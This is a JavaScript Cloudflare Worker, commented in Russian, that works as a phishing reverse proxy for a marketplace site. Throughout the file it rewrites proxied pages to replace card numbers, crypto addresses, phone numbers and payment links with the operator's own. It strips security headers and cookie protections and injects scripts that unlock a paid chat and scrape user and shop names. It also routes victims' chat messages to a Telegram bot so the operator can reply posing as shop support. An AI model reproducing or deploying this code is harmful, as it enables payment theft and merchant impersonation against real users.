"use strict";

// ================================================================
// CONFIGURATION — slon6
// ================================================================

const PROXY_CONFIG = {
  originUrl:   "https://krab-2.cc",
  originHost:  "krab-2.cc",
  workerHost:  "autumn-lab-3570.justkeymap.workers.dev/",       // <-- ваш workers.dev домен
};

const REPLACEMENT_CONFIG = {
  // Карты / реквизиты (подставляются вместо любых 16-значных номеров)
  cardNumber:    "22813371051000",          // <-- ваш номер карты

  // Крипто-адреса (USDT TRC-20, BTC, ETH)
  cryptoAddress: "huitebelox",           // <-- ваш крипто-адрес

  // Телефоны — все найденные +7 / 8 номера заменяются на этот
  phoneNumber:   "+7 (880) 555-35-35",            // <-- ваш номер телефона

  // Внешние платёжные ссылки (fasttruetransfer.pro и т.п.)
  paymentLinkUrl:  "https://t.me-alone_visionaries",   // <-- ваша ссылка для оплаты
  paymentLinkText: "Пройдите на хуй ", // текст кнопки

  // Текстовые замены  { from: "...", to: "..." }
  textReplacements: [
    // Пример: убрать упоминания телеграм-ботов оригинала
    // { from: "@Krnmr145_bot",   to: "@YOUR_BOT" },
    // { from: "openkrab.to",     to: "yoursite.com" },
  ],
};

const TELEGRAM_CONFIG = {
  botToken:     "YOUR_BOT_TOKEN",                 // <-- токен бота из @BotFather
  targetChatId: "YOUR_CHAT_ID",                   // <-- chat_id куда отправлять
};

// ================================================================
// CONSTANTS
// ================================================================

const MAX_STORED_MESSAGES_PER_CHAT = 200;

const KV_TTL_SECONDS = {
  messages:  60 * 60 * 24 * 30,
  chatMeta:  60 * 60 * 24 * 30,
  tgMapping: 60 * 60 * 24 * 7,
};

const KV_KEY = {
  chatMessages: (chatUuid) => `chat:${chatUuid}:messages`,
  chatMeta:     (chatUuid) => `chat:${chatUuid}:meta`,
  tgMessage:    (tgMsgId)  => `telegram:msg:${tgMsgId}`,
};

// ================================================================
// REGEX PATTERNS
// ================================================================

const CARD_NUMBER_RE      = /\b(\d{4}[\s\u00A0\-]?\d{4}[\s\u00A0\-]?\d{4}[\s\u00A0\-]?\d{4})\b/g;
const CRYPTO_ADDRESS_RE   = /\b(T[A-Za-z0-9]{33}|bc1[a-zA-Z0-9]{39,59}|0x[a-fA-F0-9]{40}|[13][a-zA-Z0-9]{25,34})\b/g;
const PHONE_NUMBER_RE     = /(\+7|8)\s*[\(\-]?\s*\d{3}\s*[\)\-]?\s*\d{3}\s*[\-]?\s*\d{2}\s*[\-]?\s*\d{2}/g;
const PAYMENT_LINK_RE     = /https?:\/\/fasttruetransfer\.pro\/[^\s"'<>]+/g;
const AUTH_PATH_RE        = /^\/(entry|register|captcha|login|logout|auth|signup)/i;
const BINARY_PATH_RE      = /^\/(random\/ava\/|storage\/image[s]?\/|img\/|images?\/|uploads?\/|avatars?\/|static\/|assets\/)/i;
const BINARY_EXTENSION_RE = /\.(png|jpe?g|gif|webp|ico|svg|woff2?|ttf|eot|otf|mp4|webm|ogg|mp3|pdf|zip|wasm)(\?.*)?$/i;
const BINARY_MIME_RE      = /^(image\/|audio\/|video\/|font\/|application\/(octet-stream|pdf|zip|wasm))/i;
const CHAT_UUID_RE        = /^\/chat\/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})/i;

const STRIPPED_ORIGIN_RESPONSE_HEADERS = new Set([
  "content-security-policy",
  "content-security-policy-report-only",
  "x-frame-options",
  "content-encoding",
  "set-cookie",
]);

const STRIPPED_CF_REQUEST_HEADERS = [
  "cf-connecting-ip", "cf-ipcountry", "cf-ray",
  "cf-visitor", "cf-worker", "x-forwarded-for",
];

// ================================================================
// ENTRY POINT
// ================================================================

export default {
  async fetch(request, env) {
    try {
      return await routeRequest(request, env);
    } catch (error) {
      console.error("[Worker] Unhandled error:", error.message, error.stack);
      return new Response(`Worker error: ${error.message}`, { status: 500 });
    }
  },
};

// ================================================================
// ROUTER
// ================================================================

async function routeRequest(request, env) {
  const url      = new URL(request.url);
  const pathname = url.pathname;
  const method   = request.method;

  if (method === "OPTIONS") {
    return new Response(null, {
      status: 204,
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type, Accept, Cookie, Authorization",
      },
    });
  }

  if (pathname === "/setup-telegram-webhook" && method === "GET") {
    return setupTelegramWebhook();
  }

  if (pathname === "/tg-webhook" && method === "POST") {
    return handleTelegramWebhook(request, env);
  }

  if (pathname === "/worker-api/save-chat-meta" && method === "POST") {
    return handleSaveChatMeta(request, env);
  }

  if (pathname === "/usage-stats" && request.headers.get("Upgrade") === "websocket") {
    const pair = new WebSocketPair();
    pair[1].accept();
    pair[1].addEventListener("message", (ev) => { try { pair[1].send(ev.data); } catch {} });
    return new Response(null, { status: 101, webSocket: pair[0] });
  }

  const chatUuidMatch = pathname.match(CHAT_UUID_RE);

  if (chatUuidMatch) {
    const chatUuid = chatUuidMatch[1];

    if (pathname.endsWith("/send") && method === "POST") {
      return handleChatMessageSend(request, env, chatUuid, url);
    }

    if (pathname.includes("/messages") && method === "GET") {
      return handleChatMessagesPage(request, env, chatUuid, url);
    }

    if (method === "GET") {
      return handleChatRoomPage(request, env, chatUuid, url);
    }
  }

  return proxyRequest(request, url);
}

// ================================================================
// HANDLER: POST /chat/{uuid}/send
// ================================================================

async function handleChatMessageSend(request, env, chatUuid, url) {
  const bodyBuffer  = await request.arrayBuffer();
  const bodyText    = new TextDecoder().decode(bodyBuffer);

  let messageText = "";
  const contentType = request.headers.get("content-type") || "";

  if (contentType.includes("multipart/form-data")) {
    const boundary = contentType.split("boundary=")[1];
    if (boundary) {
      const parts = bodyText.split("--" + boundary);
      for (const part of parts) {
        if (part.includes('name="message"')) {
          const valStart = part.indexOf("\r\n\r\n");
          if (valStart > -1) {
            messageText = part.substring(valStart + 4).replace(/\r\n--$/, "").trim();
          }
        }
      }
    }
  } else {
    const formData = new URLSearchParams(bodyText);
    messageText = (
      formData.get("message") ||
      formData.get("msg")     ||
      formData.get("text")    || ""
    ).trim();
  }

  if (!messageText) {
    return buildChatRedirectResponse(chatUuid, url);
  }

  const chatMeta = await loadChatMeta(env, chatUuid);

  const outgoingMessage = {
    id:           crypto.randomUUID(),
    chatUuid,
    text:         messageText,
    senderName:   chatMeta.visitorName   || "Пользователь",
    senderAvatar: chatMeta.visitorAvatar || "",
    direction:    "outgoing",
    timestamp:    Date.now(),
  };

  await Promise.all([
    saveChatMessage(env, chatUuid, outgoingMessage),
    sendTelegramNotification(env, chatUuid, outgoingMessage, chatMeta),
  ]);

  return buildChatRedirectResponse(chatUuid, url);
}

// ================================================================
// HANDLER: GET /chat/{uuid}/messages
// ================================================================

async function handleChatMessagesPage(request, env, chatUuid, url) {
  const [originResponse, kvMessages] = await Promise.all([
    fetchFromOrigin(request, url),
    loadChatMessages(env, chatUuid),
  ]);

  const contentType = originResponse.headers.get("content-type") || "";

  if (!contentType.includes("html")) {
    return originResponse;
  }

  let html = await originResponse.text();

  if (kvMessages.length > 0) {
    const chatMeta           = await loadChatMeta(env, chatUuid);
    const injectionScriptTag = buildMessageInjectionScriptTag(kvMessages, chatMeta);
    html = insertBeforeBodyClose(html, injectionScriptTag);
  }

  html = rewriteAllOriginUrls(html);

  const responseHeaders = cloneResponseHeaders(originResponse);
  return new Response(html, { status: originResponse.status, headers: responseHeaders });
}

// ================================================================
// HANDLER: GET /chat/{uuid}/
// ================================================================

async function handleChatRoomPage(request, env, chatUuid, url) {
  const originResponse = await fetchFromOrigin(request, url);
  const contentType    = originResponse.headers.get("content-type") || "";

  if (!contentType.includes("html")) {
    return originResponse;
  }

  let html = await originResponse.text();

  const unlockScriptTag = buildChatUnlockScriptTag(chatUuid);
  html = insertBeforeBodyClose(html, unlockScriptTag);
  html = rewriteAllOriginUrls(html);
  html = replacePaymentDetails(html);

  const responseHeaders = cloneResponseHeaders(originResponse);
  return new Response(html, { status: originResponse.status, headers: responseHeaders });
}

// ================================================================
// HANDLER: POST /tg-webhook
// ================================================================

async function handleTelegramWebhook(request, env) {
  const payload = await request.json().catch(() => null);
  if (!payload) return new Response("ok");

  const telegramMessage = payload.message || payload.channel_post;

  if (!telegramMessage?.text || !telegramMessage?.reply_to_message) {
    return new Response("ok");
  }

  const repliedToMessageId = telegramMessage.reply_to_message.message_id;
  const replyText          = telegramMessage.text;

  const mappingJson = await env.CHAT.get(KV_KEY.tgMessage(repliedToMessageId));
  if (!mappingJson) return new Response("ok");

  const { chatUuid, partnerName, partnerAvatar } = JSON.parse(mappingJson);

  const incomingMessage = {
    id:           crypto.randomUUID(),
    chatUuid,
    text:         replyText,
    senderName:   partnerName   || "Поддержка",
    senderAvatar: partnerAvatar || "",
    direction:    "incoming",
    timestamp:    Date.now(),
  };

  await saveChatMessage(env, chatUuid, incomingMessage);

  return new Response("ok");
}

// ================================================================
// HANDLER: POST /worker-api/save-chat-meta
// ================================================================

async function handleSaveChatMeta(request, env) {
  const payload = await request.json().catch(() => null);
  if (!payload?.chatUuid) {
    return jsonResponse({ success: false }, 400);
  }

  const existingMeta = await loadChatMeta(env, payload.chatUuid);

  const updatedMeta = {
    ...existingMeta,
    ...(payload.partnerName    != null && { partnerName:    payload.partnerName }),
    ...(payload.partnerAvatar  != null && { partnerAvatar:  payload.partnerAvatar }),
    ...(payload.visitorName    != null && { visitorName:    payload.visitorName }),
    ...(payload.visitorAvatar  != null && { visitorAvatar:  payload.visitorAvatar }),
  };

  await env.CHAT.put(
    KV_KEY.chatMeta(payload.chatUuid),
    JSON.stringify(updatedMeta),
    { expirationTtl: KV_TTL_SECONDS.chatMeta },
  );

  return jsonResponse({ success: true }, 200, { "Access-Control-Allow-Origin": "*" });
}

// ================================================================
// HANDLER: GET /setup-telegram-webhook
// ================================================================

async function setupTelegramWebhook() {
  const webhookUrl  = `https://${PROXY_CONFIG.workerHost}/tg-webhook`;
  const apiResponse = await fetch(
    `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/setWebhook`,
    {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify({ url: webhookUrl }),
    },
  );

  return new Response(await apiResponse.text(), {
    headers: { "content-type": "application/json" },
  });
}

// ================================================================
// KV: Messages
// ================================================================

async function saveChatMessage(env, chatUuid, message) {
  const kvKey        = KV_KEY.chatMessages(chatUuid);
  const existingJson = await env.CHAT.get(kvKey);
  const messageList  = existingJson ? JSON.parse(existingJson) : [];

  messageList.push(message);

  if (messageList.length > MAX_STORED_MESSAGES_PER_CHAT) {
    messageList.splice(0, messageList.length - MAX_STORED_MESSAGES_PER_CHAT);
  }

  await env.CHAT.put(kvKey, JSON.stringify(messageList), {
    expirationTtl: KV_TTL_SECONDS.messages,
  });
}

async function loadChatMessages(env, chatUuid) {
  const val = await env.CHAT.get(KV_KEY.chatMessages(chatUuid));
  return val ? JSON.parse(val) : [];
}

async function loadChatMeta(env, chatUuid) {
  const val = await env.CHAT.get(KV_KEY.chatMeta(chatUuid));
  return val ? JSON.parse(val) : {};
}

// ================================================================
// TELEGRAM: Notification
// ================================================================

async function sendTelegramNotification(env, chatUuid, message, chatMeta) {
  const { botToken, targetChatId } = TELEGRAM_CONFIG;
  if (!botToken || botToken === "YOUR_BOT_TOKEN") return;

  const partnerName = chatMeta.partnerName || "Неизвестный";
  const visitorName = message.senderName;

  const notificationText =
    `💬 Новое сообщение\n\n` +
    `👤 От: ${visitorName}\n` +
    `🏪 Кому: ${partnerName}\n` +
    `🔗 Чат: ${chatUuid}\n\n` +
    `📝 ${message.text}\n\n` +
    `↩️ Reply → ответ придёт в чат от имени «${partnerName}»`;

  try {
    const apiResponse = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: targetChatId,
          text:    notificationText,
        }),
      },
    );

    const apiResult = await apiResponse.json();

    if (apiResult.ok && apiResult.result?.message_id) {
      await env.CHAT.put(
        KV_KEY.tgMessage(apiResult.result.message_id),
        JSON.stringify({
          chatUuid,
          partnerName:   chatMeta.partnerName   || "Поддержка",
          partnerAvatar: chatMeta.partnerAvatar || "",
        }),
        { expirationTtl: KV_TTL_SECONDS.tgMapping },
      );
    }
  } catch {}
}

// ================================================================
// CLIENT SCRIPT: buildChatUnlockScriptTag
// Разблокирует чат (убирает ошибку «нужна покупка на 1000₽»)
// и сохраняет мета-данные чата (имена, аватары)
// ================================================================

function buildChatUnlockScriptTag(chatUuid) {
  const workerHost = PROXY_CONFIG.workerHost;

  return `
<script>
(function unlockChatForm() {
  var CHAT_UUID   = "${chatUuid}";
  var WORKER_HOST = "${workerHost}";

  function tryUnlock() {
    // Скрыть секции ошибок (блокировка чата, ограничения)
    document.querySelectorAll("section.error, .error__text, .error__btn, .error__icon, .error__title, .error_panel").forEach(function(el) {
      el.style.setProperty("display", "none", "important");
    });

    var errorSection = document.querySelector("section.error");
    if (errorSection) {
      var wrapper = errorSection.parentElement;
      if (wrapper && !wrapper.querySelector("[data-unlock-placeholder]")) {
        var placeholder = document.createElement("div");
        placeholder.setAttribute("data-unlock-placeholder", "1");
        placeholder.style.cssText = "display:flex;align-items:center;justify-content:center;min-height:60vh;font-family:inherit";
        placeholder.innerHTML = "<p style='color:#888;font-size:14px'>Загрузка чата...</p>";
        wrapper.insertBefore(placeholder, errorSection);
        setTimeout(function() { window.location.reload(); }, 800);
      }
    }

    // Разблокировать форму ввода сообщений
    document.querySelectorAll("textarea, input[type='text'], button[type='submit'], form").forEach(function(el) {
      el.removeAttribute("disabled");
      el.removeAttribute("readonly");
      el.style.removeProperty("pointer-events");
      el.style.removeProperty("opacity");
    });

    document.querySelectorAll("[class*='disabled'],[class*='locked'],[class*='blocked'],[class*='inactive'],[class*='restrict']").forEach(function(el) {
      el.classList.remove("disabled","locked","blocked","inactive","restricted");
    });

    // Убедиться что форма отправки указывает на наш /send
    document.querySelectorAll("form.messenge_right_form, form[action*='/send']").forEach(function(form) {
      var action = (form.getAttribute("action") || "").trim();
      if (!action || action === "#" || action.indexOf("/send") > -1) {
        form.setAttribute("action", "/chat/" + CHAT_UUID + "/send?messagesCount=50&labels=&roomsCount=40&q=");
        form.setAttribute("method", "post");
      }
    });

    // Собираем мета-данные: имя и аватар партнёра/пользователя
    var partnerName   = "";
    var partnerAvatar = "";
    var visitorName   = "";
    var visitorAvatar = "";

    // Имя партнёра (магазина) — в заголовке чата
    var titleEl = document.querySelector(".messenger_right_title");
    if (titleEl) partnerName = titleEl.innerText.trim();

    // Аватар партнёра — в шапке чата
    var avatarEl = document.querySelector(".messenger_right_top img");
    if (avatarEl) partnerAvatar = avatarEl.src;

    // Имя пользователя — ищем в сообщениях (отправитель)
    var outputItems = document.querySelectorAll(".messenger_output_item");
    if (outputItems.length > 0) {
      var lastItem = outputItems[0];
      var nameEl = lastItem.querySelector(".messenger_output_title");
      if (nameEl && !nameEl.classList.contains("admin-name")) {
        visitorName = nameEl.innerText.trim();
      }
    }

    if (partnerName || visitorName) {
      fetch("https://" + WORKER_HOST + "/worker-api/save-chat-meta", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chatUuid:      CHAT_UUID,
          partnerName:   partnerName,
          partnerAvatar: partnerAvatar,
          visitorName:   visitorName,
          visitorAvatar: visitorAvatar,
        }),
      }).catch(function() {});
    }
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", tryUnlock);
  } else {
    tryUnlock();
  }
  setTimeout(tryUnlock, 500);
  setTimeout(tryUnlock, 1500);
  setTimeout(tryUnlock, 3000);
})();
</script>`;
}

// ================================================================
// CLIENT SCRIPT: buildMessageInjectionScriptTag
// Вставляет наши сохранённые сообщения (ответы из ТГ) в чат
// ================================================================

function buildMessageInjectionScriptTag(kvMessages, chatMeta) {
  const messagesJson = JSON.stringify(kvMessages);

  return `
<script>
(function injectStoredMessages() {
  var STORED_MESSAGES = ${messagesJson};
  if (!STORED_MESSAGES.length) return;

  var messageContainer = document.querySelector(".messenger_output.chat_messages") ||
                         document.querySelector(".messenger_output") ||
                         document.querySelector(".messages_list_12345");

  if (!messageContainer) return;

  var existingIds = new Set();
  messageContainer.querySelectorAll("[data-worker-injected]").forEach(function(el) {
    existingIds.add(el.getAttribute("data-msg-id"));
  });

  var exampleItem = messageContainer.querySelector(".messenger_output_item");

  STORED_MESSAGES.forEach(function(msg) {
    if (existingIds.has(msg.id)) return;

    var newElement;

    if (exampleItem) {
      newElement = exampleItem.cloneNode(true);

      var avatarImg = newElement.querySelector("img");
      if (avatarImg && msg.senderAvatar) {
        avatarImg.src = msg.senderAvatar;
        avatarImg.alt = msg.senderName;
      }

      var nameEl = newElement.querySelector(".messenger_output_title");
      if (nameEl) {
        nameEl.textContent = msg.senderName;
        nameEl.classList.remove("admin-name");
      }

      var textEl = newElement.querySelector(".messenger_output_text");
      if (textEl) textEl.innerHTML = "<p>" + msg.text.replace(/</g,"&lt;").replace(/>/g,"&gt;") + "</p>";

      var timeEl = newElement.querySelector(".messenger_output_data");
      if (timeEl) {
        var d = new Date(msg.timestamp);
        var pad = function(n) { return n < 10 ? "0"+n : n; };
        timeEl.textContent = pad(d.getMonth()+1) + "-" + pad(d.getDate()) + "-" +
          d.getFullYear() + " " + pad(d.getHours()) + ":" + pad(d.getMinutes());
      }

    } else {
      var timeStr = new Date(msg.timestamp).toLocaleTimeString("ru-RU", {
        hour: "2-digit", minute: "2-digit",
      });
      newElement = document.createElement("div");
      newElement.className = "messenger_output_item";
      var isIncoming = msg.direction === "incoming";

      var avatarHtml = msg.senderAvatar
        ? "<img src='" + msg.senderAvatar + "' alt='" + msg.senderName + "'/>"
        : "<img src='/random/ava/default.webp' alt='user'/>";

      newElement.innerHTML =
        avatarHtml +
        "<div class='messenger_output_info'>" +
          "<p class='messenger_output_data'>" + timeStr + "</p>" +
          "<p class='messenger_output_title" + (isIncoming ? " admin-name" : "") + "'>" + msg.senderName + "</p>" +
          "<div class='messenger_output_text'><p>" + msg.text.replace(/</g,"&lt;").replace(/>/g,"&gt;") + "</p></div>" +
        "</div>";
    }

    newElement.setAttribute("data-worker-injected", "true");
    newElement.setAttribute("data-msg-id", msg.id);

    var firstChild = messageContainer.querySelector(".messenger_output_item");
    if (firstChild) {
      messageContainer.insertBefore(newElement, firstChild);
    } else {
      messageContainer.appendChild(newElement);
    }
  });

  messageContainer.scrollTop = messageContainer.scrollHeight;
})();
</script>`;
}

// ================================================================
// TRANSPARENT PROXY
// ================================================================

async function proxyRequest(request, url) {
  const isAuthPath   = AUTH_PATH_RE.test(url.pathname);
  const isBinaryPath = BINARY_PATH_RE.test(url.pathname) || BINARY_EXTENSION_RE.test(url.pathname);

  let requestBody = null;
  if (request.method !== "GET" && request.method !== "HEAD") {
    requestBody = await request.arrayBuffer();
  }

  const originResponse  = await fetchFromOrigin(request, url, requestBody);
  const responseHeaders = buildProxiedResponseHeaders(originResponse);

  if (originResponse.status >= 300 && originResponse.status < 400) {
    return new Response(null, { status: originResponse.status, headers: responseHeaders });
  }

  const contentType = originResponse.headers.get("content-type") || "";

  if (isBinaryPath || BINARY_MIME_RE.test(contentType)) {
    if (contentType) responseHeaders.set("content-type", contentType);
    responseHeaders.set("access-control-allow-origin", "*");
    responseHeaders.set("cache-control", "public, max-age=86400");
    return new Response(originResponse.body, { status: originResponse.status, headers: responseHeaders });
  }

  let responseText = rewriteAllOriginUrls(await originResponse.text());

  if (!isAuthPath && (contentType.includes("html") || contentType.includes("json") || contentType.includes("javascript"))) {
    responseText = replacePaymentDetails(responseText);
  }

  responseHeaders.set("content-type", contentType || "text/html; charset=utf-8");
  responseHeaders.delete("content-length");

  return new Response(responseText, { status: originResponse.status, headers: responseHeaders });
}

// ================================================================
// FETCH FROM ORIGIN
// ================================================================

async function fetchFromOrigin(request, url, bodyOverride) {
  const requestHeaders = new Headers(request.headers);
  requestHeaders.set("Host", PROXY_CONFIG.originHost);
  requestHeaders.set("Accept-Encoding", "identity");

  for (const headerName of STRIPPED_CF_REQUEST_HEADERS) {
    requestHeaders.delete(headerName);
  }

  const originHeader  = requestHeaders.get("Origin")  || "";
  const refererHeader = requestHeaders.get("Referer") || "";

  if (originHeader.includes(PROXY_CONFIG.workerHost)) {
    requestHeaders.set("Origin", `https://${PROXY_CONFIG.originHost}`);
  }
  if (refererHeader.includes(PROXY_CONFIG.workerHost)) {
    requestHeaders.set("Referer",
      refererHeader.replace(PROXY_CONFIG.workerHost, PROXY_CONFIG.originHost));
  }

  const requestBody = bodyOverride !== undefined
    ? bodyOverride
    : (request.method !== "GET" && request.method !== "HEAD" ? request.body : null);

  return fetch(`${PROXY_CONFIG.originUrl}${url.pathname}${url.search}`, {
    method:   request.method,
    headers:  requestHeaders,
    body:     requestBody,
    redirect: "manual",
  });
}

// ================================================================
// HELPERS: Response headers
// ================================================================

function buildProxiedResponseHeaders(originResponse) {
  const headers = new Headers();

  for (const [name, value] of originResponse.headers) {
    if (!STRIPPED_ORIGIN_RESPONSE_HEADERS.has(name.toLowerCase())) {
      headers.set(name, value);
    }
  }

  for (const cookie of getSetCookieHeaders(originResponse.headers)) {
    headers.append("set-cookie", stripCookieSecurityAttributes(cookie));
  }

  if (originResponse.headers.has("location")) {
    headers.set("location",
      rewriteSingleOriginUrl(originResponse.headers.get("location")));
  }

  return headers;
}

function cloneResponseHeaders(originResponse) {
  const headers = buildProxiedResponseHeaders(originResponse);
  headers.delete("content-length");
  return headers;
}

function getSetCookieHeaders(headers) {
  if (typeof headers.getSetCookie === "function") return headers.getSetCookie();
  const value = headers.get("set-cookie");
  return value ? [value] : [];
}

function stripCookieSecurityAttributes(rawCookie) {
  return rawCookie
    .replace(/;\s*domain=[^;]*/gi, "")
    .replace(/;\s*secure\b/gi, "")
    .replace(/;\s*samesite=[^;]*/gi, "");
}

// ================================================================
// HELPERS: URL rewriting
// ================================================================

function rewriteSingleOriginUrl(urlString) {
  return urlString
    .replace(`https://${PROXY_CONFIG.originHost}`, `https://${PROXY_CONFIG.workerHost}`)
    .replace(`http://${PROXY_CONFIG.originHost}`,  `https://${PROXY_CONFIG.workerHost}`);
}

function rewriteAllOriginUrls(text) {
  return text
    .replaceAll(`https://${PROXY_CONFIG.originHost}`, `https://${PROXY_CONFIG.workerHost}`)
    .replaceAll(`http://${PROXY_CONFIG.originHost}`,  `https://${PROXY_CONFIG.workerHost}`)
    .replaceAll(PROXY_CONFIG.originHost, PROXY_CONFIG.workerHost);
}

// ================================================================
// HELPERS: Payment details replacement
// ================================================================

function replacePaymentDetails(html) {
  const dataUris     = [];
  const scriptBlocks = [];
  const styleBlocks  = [];
  const urlAttrs     = [];

  let result = html
    .replace(/data:[a-z+\/.\-]+;base64,[A-Za-z0-9+\/=\s]+/gi,
      (match) => { dataUris.push(match);     return `\x00DATA${dataUris.length - 1}\x00`; })
    .replace(/<script[\s\S]*?<\/script>/gi,
      (match) => { scriptBlocks.push(match); return `\x00SCRIPT${scriptBlocks.length - 1}\x00`; })
    .replace(/<style[\s\S]*?<\/style>/gi,
      (match) => { styleBlocks.push(match);  return `\x00STYLE${styleBlocks.length - 1}\x00`; })
    .replace(/((?:src|href|srcset|action|poster)\s*=\s*["'][^"']*["'])/gi,
      (match) => { urlAttrs.push(match);     return `\x00URL${urlAttrs.length - 1}\x00`; });

  // Замена 16-значных номеров карт
  if (REPLACEMENT_CONFIG.cardNumber && REPLACEMENT_CONFIG.cardNumber !== "XXXX XXXX XXXX XXXX") {
    result = result.replace(CARD_NUMBER_RE, REPLACEMENT_CONFIG.cardNumber);
  }

  // Замена крипто-адресов
  if (REPLACEMENT_CONFIG.cryptoAddress && REPLACEMENT_CONFIG.cryptoAddress !== "YOUR_CRYPTO_ADDRESS") {
    result = result.replace(CRYPTO_ADDRESS_RE, REPLACEMENT_CONFIG.cryptoAddress);
  }

  // Замена телефонных номеров
  if (REPLACEMENT_CONFIG.phoneNumber && REPLACEMENT_CONFIG.phoneNumber !== "+7 (XXX) XXX-XX-XX") {
    result = result.replace(PHONE_NUMBER_RE, REPLACEMENT_CONFIG.phoneNumber);
  }

  // Замена замаскированных номеров телефона (************)
  if (REPLACEMENT_CONFIG.phoneNumber && REPLACEMENT_CONFIG.phoneNumber !== "+7 (XXX) XXX-XX-XX") {
    result = result.replace(
      /(<p[^>]*class="right_attr_item"[^>]*>Номер телефона:\s*<strong>)\*{6,}(<\/strong>)/gi,
      "$1" + REPLACEMENT_CONFIG.phoneNumber + "$2"
    );
  }

  // Замена платёжных ссылок (fasttruetransfer.pro и т.п.)
  if (REPLACEMENT_CONFIG.paymentLinkUrl && REPLACEMENT_CONFIG.paymentLinkUrl !== "https://YOUR-PAYMENT-LINK") {
    result = result.replace(PAYMENT_LINK_RE, REPLACEMENT_CONFIG.paymentLinkUrl);
  }

  // Пользовательские текстовые замены
  for (const { from, to } of REPLACEMENT_CONFIG.textReplacements) {
    if (from && to) {
      result = result.replaceAll(from, to);
    }
  }

  return result
    .replace(/\x00URL(\d+)\x00/g,    (_, i) => urlAttrs[Number(i)])
    .replace(/\x00STYLE(\d+)\x00/g,  (_, i) => styleBlocks[Number(i)])
    .replace(/\x00SCRIPT(\d+)\x00/g, (_, i) => scriptBlocks[Number(i)])
    .replace(/\x00DATA(\d+)\x00/g,   (_, i) => dataUris[Number(i)]);
}

// ================================================================
// HELPERS: Misc
// ================================================================

function insertBeforeBodyClose(html, scriptTag) {
  return html.includes("</body>")
    ? html.replace("</body>", `${scriptTag}\n</body>`)
    : html + scriptTag;
}

function buildChatRedirectResponse(chatUuid, originalUrl) {
  const params = new URLSearchParams(originalUrl.search);
  params.delete("message");
  params.delete("msg");
  params.delete("text");

  const queryString = params.toString();
  const redirectUrl = `https://${PROXY_CONFIG.workerHost}/chat/${chatUuid}/${queryString ? `?${queryString}` : ""}`;

  return new Response(null, {
    status:  302,
    headers: { location: redirectUrl },
  });
}

function jsonResponse(data, status = 200, extraHeaders = {}) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { "content-type": "application/json; charset=utf-8", ...extraHeaders },
  });
}
